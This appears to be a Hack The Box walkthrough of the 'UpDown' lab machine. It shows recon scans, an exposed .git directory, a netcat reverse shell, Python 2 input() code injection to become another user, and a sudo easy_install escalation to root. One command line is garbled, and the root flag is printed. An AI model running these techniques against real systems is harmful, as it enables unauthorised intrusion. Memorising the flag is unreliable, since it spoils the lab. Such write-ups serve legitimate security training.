---
tags:
title: UpDown - Medium (HTB)
permalink: /UpDown-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.236.23                                           
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-24 00:37 -0500
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.65% done; ETC: 00:38 (0:00:00 remaining)
Nmap scan report for updown.htb (10.129.236.23)
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.01 seconds
```

## Website 

![[Pasted image 20251224023745.png]]

![[Pasted image 20251224023820.png]]

```bash
 wfuzz -c -t 200 -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://updown.htb --hh=1131
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://updown.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000019:   403        9 L      28 W       281 Ch      "dev"
```

```bash
dirsearch -u http://siteisup.htb/dev
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/zs1n/Desktop/htb/updown/reports/http_updown.htb/reports/http_siteisup.htb/_dev_25-12-24_01-21-39.txt

Target: http://siteisup.htb/

[01:21:39] Starting: dev/
[01:21:56] 301 -  315B  - /dev/.git  ->  http://siteisup.htb/dev/.git/      
[01:21:56] 200 -   73B  - /dev/.git/description                             
[01:21:56] 200 -  298B  - /dev/.git/config                                  
[01:21:56] 200 -  602B  - /dev/.git/                                        
[01:21:56] 200 -  412B  - /dev/.git/branches/
[01:21:56] 200 -  674B  - /dev/.git/hooks/                                  
[01:21:56] 200 -   21B  - /dev/.git/HEAD                                    
[01:21:56] 200 -  458B  - /dev/.git/info/                                   
[01:21:56] 200 -  240B  - /dev/.git/info/exclude
[01:21:56] 200 -  521B  - /dev/.git/index                                   
[01:21:56] 200 -  179B  - /dev/.git/logs/HEAD                               
[01:21:56] 301 -  325B  - /dev/.git/logs/refs  ->  http://siteisup.htb/dev/.git/logs/refs/
[01:21:56] 200 -  483B  - /dev/.git/logs/
[01:21:56] 301 -  333B  - /dev/.git/logs/refs/remotes  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/
[01:21:56] 200 -  179B  - /dev/.git/logs/refs/remotes/origin/HEAD           
[01:21:56] 301 -  340B  - /dev/.git/logs/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/logs/refs/remotes/origin/
[01:21:56] 301 -  331B  - /dev/.git/logs/refs/heads  ->  http://siteisup.htb/dev/.git/logs/refs/heads/
[01:21:57] 200 -  465B  - /dev/.git/objects/
[01:21:57] 200 -  112B  - /dev/.git/packed-refs
[01:21:57] 301 -  326B  - /dev/.git/refs/heads  ->  http://siteisup.htb/dev/.git/refs/heads/
[01:21:57] 200 -  472B  - /dev/.git/refs/                                   
[01:21:57] 301 -  335B  - /dev/.git/refs/remotes/origin  ->  http://siteisup.htb/dev/.git/refs/remotes/origin/
[01:21:57] 301 -  325B  - /dev/.git/refs/tags  ->  http://siteisup.htb/dev/.git/refs/tags/
[01:21:57] 301 -  328B  - /dev/.git/refs/remotes  ->  http://siteisup.htb/dev/.git/refs/remotes/
[01:21:57] 200 -   30B  - /dev/.git/refs/remotes/origin/HEAD

```
![[Pasted image 20251224032131.png]]

![[Pasted image 20251224034611.png]]

![[Pasted image 20251224034603.png]]

![[Pasted image 20251224034621.png]]

![[Pasted image 20251224042427.png]]

![[Pasted image 20251224043224.png]]

```bash
nc -nlvp 4444 
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.236.23] 40638
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
www-data@updown:/var/www/dev$ whoami
whoami
www-data
```

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

```bash
www-data@updown:/home/developer/dev$ python2 siteisup_test.py
Enter URL here:__import__('os').system('id')
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
  File "siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
www-data@updown:/home/developer/dev$ ls
siteisup  siteisup_test.py
www-data@updown:/home/developer/dev$ ./siteisup 
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('bash;^H
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    __import__('os').system('bash;
                                  ^
SyntaxError: EOL while scanning string literal
www-data@updown:/home/developer/dev$ ./siteisup 
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('bash')
developer@updown:/home/developer/dev$
```

```bash
developer@updown:/home/developer/dev$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install

```

```bash
developer@updown:/tmp/exploit2$ TF=$(mktemp -d)
 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py; os.execl('/bin/sh', 'sh', '-c', 
developer@updown:/tmp/exploit2$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.QJpNa1uvMt
Writing /tmp/tmp.QJpNa1uvMt/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.QJpNa1uvMt/egg-dist-tmp-YEAKez
# whoami
root
```

```bash
# cat root.txt
9120af7b1102d3416b5cec722f4865ad
```